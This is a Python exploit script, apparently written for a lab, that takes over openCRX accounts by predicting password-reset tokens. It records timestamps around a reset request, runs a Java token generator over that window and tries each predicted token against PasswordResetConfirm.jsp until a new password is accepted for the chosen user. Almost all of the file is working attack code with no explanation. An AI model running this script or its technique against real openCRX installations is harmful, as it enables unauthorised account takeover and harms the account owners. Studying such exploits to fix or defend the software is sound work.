#!/usr/bin/python3

import requests
import argparse
import os
import time
import argparse
from rich.console import Console
from rich.progress import Progress
from rich import print
import re
import subprocess

console = Console()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
forgot_payload = {
    'id': 'guest'
    }
forgot_url = f"http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp"
start_time_stamp = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
time.sleep(1)
console.log(f"[yellow][+] Start Time Stamp is: {start_time_stamp.stdout.decode().rstrip()}")
#res = requests.post(url = forgot_url, data = forgot_payload)
os.system("curl -x http://127.0.0.1:8080 -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp'")
#if res.status_code == 200 and 'Unable to request password reset' in res.text:
#    console.log(f"[bold red][-] Look's like guest is not present on the openCRX installation")
#    sys.exit(0)
#else:
time.sleep(1)
#response_header_date = res.headers["Date"]
stop_time_stamp = subprocess.run(r"date +%s%3N", shell = True, capture_output = True)
console.log(f"[yellow][+] Stop Time Stamp is: {stop_time_stamp.stdout.decode().rstrip()}")
console.log(f"[bold green][+] guest user found!! Proceeding with further exploitation...")
console.log(f"[yellow][+] Producing Time Stamp List...")
compile_java = subprocess.run(r"javac OpenCRXToken.java", shell = True, capture_output = True)
if compile_java.returncode == 0:
    run_java = subprocess.run(f"java OpenCRXToken {start_time_stamp.stdout.decode().rstrip()} {stop_time_stamp.stdout.decode().rstrip()} > tokens.txt", shell = True, capture_output = True)
    #run_java = subprocess.run(f"java MagicTokenGenerator {start_time_stamp.stdout.decode().rstrip()} {stop_time_stamp.stdout.decode().rstrip()} > tokens.txt", shell = True, capture_output = True)
    if run_java.returncode == 0:
        console.log(f"[yellow][+] Time Stamp List produced successfully and it is stored in the [bold]time_stamps[/bold] file")

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        #t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload, proxies=proxies)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break
